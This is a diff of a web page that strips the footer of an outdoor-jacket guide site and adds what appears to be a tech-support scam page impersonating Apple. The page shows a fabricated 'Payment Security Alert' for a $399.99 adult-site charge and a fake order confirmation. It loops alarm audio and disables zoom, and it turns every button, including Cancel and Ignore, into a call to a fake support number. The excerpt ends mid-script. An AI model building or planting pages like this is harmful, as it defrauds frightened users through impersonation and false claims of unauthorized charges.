-275 L1501 -255 L1567 -234 L1633 -209 L1694 -175 L1745 -133 L1782 -82 L1806 -26 L1818 32 L1823 89 L1826 144 L1826 198 L1824 249 L1813 300Z"/><path d="M1958 300 L1923 358 L1871 409 L1814 453 L1767 494 L1742 539 L1740 596 L1757 668 L1780 756 L1792 854 L1781 949 L1739 1030 L1667 1086 L1574 1113 L1470 1113 L1366 1094 L1269 1065 L1180 1034 L1100 1006 L1026 980 L956 955 L890 928 L829 896 L772 862 L718 829 L663 800 L602 775 L533 754 L458 731 L382 702 L314 663 L260 613 L224 555 L205 492 L194 428 L183 364 L163 300 L135 232 L103 159 L80 81 L81 3 L115 -67 L186 -122 L287 -155 L405 -167 L523 -161 L627 -151 L709 -146 L770 -158 L815 -189 L856 -236 L901 -293 L957 -349 L1024 -397 L1100 -430 L1182 -450 L1267 -459 L1354 -459 L1443 -453 L1531 -439 L1616 -414 L1692 -377 L1755 -325 L1802 -262 L1833 -192 L1852 -121 L1868 -55 L1887 7 L1911 64 L1939 120 L1962 178 L1971 239 L1958 300Z"/><path d="M2083 300 L2033 365 L1976 424 L1930 478 L1907 535 L1911 602 L1933 685 L1961 782 L1976 888 L1964 991 L1919 1080 L1842 1148 L1741 1189 L1628 1206 L1512 1205 L1399 1192 L1292 1171 L1192 1144 L1100 1110 L1016 1068 L941 1022 L874 974 L812 932 L749 902 L677 886 L590 882 L489 882 L379 877 L271 856 L179 816 L112 756 L74 683 L58 603 L54 524 L46 449 L25 375 L-11 300 L-53 219 L-86 133 L-92 44 L-61 -38 L13 -106 L120 -153 L246 -179 L371 -189 L483 -194 L573 -203 L641 -225 L694 -262 L743 -312 L796 -369 L857 -426 L928 -479 L1010 -525 L1100 -566 L1198 -601 L1305 -628 L1416 -644 L1528 -642 L1634 -616 L1724 -564 L1792 -490 L1835 -401 L1860 -308 L1876 -221 L1894 -145 L1926 -81 L1972 -25 L2026 30 L2076 91 L2108 158 L2111 229 L2083 300Z"/><path d="M2191 300 L2151 374 L2119 444 L2108 516 L2119 597 L2142 689 L2165 792 L2170 900 L2149 1004 L2096 1097 L2015 1172 L1914 1230 L1800 1270 L1681 1296 L1559 1308 L1436 1304 L1317 1283 L1203 1241 L1100 1183 L1011 1115 L935 1049 L866 998 L794 972 L708 972 L601 992 L472 1018 L330 1034 L192 1026 L74 989 L-11 922 L-60 836 L-81 741 L-89 646 L-99 557 L-122 472 L-159 388 L-202 300 L-234 207 L-238 111 L-203 21 L-130 -58 L-27 -120 L92 -166 L210 -199 L315 -227 L404 -257 L477 -294 L541 -338 L604 -388 L669 -439 L740 -491 L817 -545 L901 -603 L994 -666 L1100 -732 L1219 -792 L1350 -836 L1486 -851 L1613 -827 L1720 -763 L1797 -666 L1844 -551 L1869 -433 L1884 -327 L1908 -242 L1949 -176 L2012 -121 L2088 -68 L2160 -9 L2213 61 L2235 140 L2225 221 L2191 300Z"/><path d="M2330 300 L2331 386 L2344 476 L2366 571 L2386 674 L2393 782 L2377 890 L2334 991 L2267 1083 L2181 1165 L2084 1238 L1978 1303 L1865 1359 L1742 1401 L1610 1421 L1472 1410 L1335 1367 L1209 1295 L1100 1209 L1009 1128 L930 1070 L849 1048 L752 1064 L630 1106 L481 1157 L317 1194 L154 1202 L12 1170 L-96 1103 L-167 1010 L-207 904 L-231 796 L-252 694 L-280 596 L-314 499 L-346 401 L-362 300 L-351 198 L-307 101 L-235 14 L-144 -62 L-47 -128 L45 -187 L129 -244 L204 -301 L277 -358 L353 -412 L434 -461 L518 -506 L604 -551 L689 -603 L775 -670 L868 -755 L974 -851 L1100 -945 L1244 -1018 L1398 -1051 L1546 -1032 L1673 -960 L1768 -846 L1828 -708 L1861 -570 L1885 -448 L1916 -353 L1966 -282 L2039 -226 L2124 -173 L2209 -114 L2278 -43 L2321 38 L2337 125 L2336 213 L2330 300Z"/></svg><div class="jk-w"><div class="jk-ft-g"><div><a class="logo" href="./"><svg viewBox="0 0 40 40" aria-hidden="true"><path d="M20 5l15 28H5z" fill="#17251F"/><path d="M20 5l6 11-3 3-3-4-3 4-3-3z" fill="#F3F4F1"/><path d="M5 33h30" stroke="#E2572B" stroke-width="3"/></svg><span>Jackets</span></a><p>An independent field guide to outdoor jackets: layering for the weather, waterproof ratings and the details that keep you dry.</p></div><div><h4>Guides</h4><a href="jacket-layering-guide.html">Jacket Layering Guide</a><a href="waterproof-ratings-guide.html">Waterproof Ratings Explained</a><a href="./#layers">Layer builder</a><a href="./#rating">Rating decoder</a></div><div><h4>Basecamp</h4><a href="about.html">About</a><a href="contact.html">Contact</a><a href="editorial-policy.html">Editorial Policy</a></div><div><h4>Legal</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a></div><div><h4>Contact</h4><p>181 Mercer Street, New York, NY 10012, United States</p><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@jackets.com">hello@jackets.com</a></div></div><p class="jk-ft-c"><span>&copy; <span id="year">2026</span> Jackets</span><span>Leave no trace &middot; Dress for the weather you will meet</span></p></div></footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your consent, cookies for our live chat and any ads shown on the site. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/626be649b0d10b6f3e6ff291/1g1qnn49c';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
+
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
+
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
+
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
+  }
+
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
+  }
+
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
+    }
+  }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
+  
+  <div class="spinner"></div>
+</div>
+
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
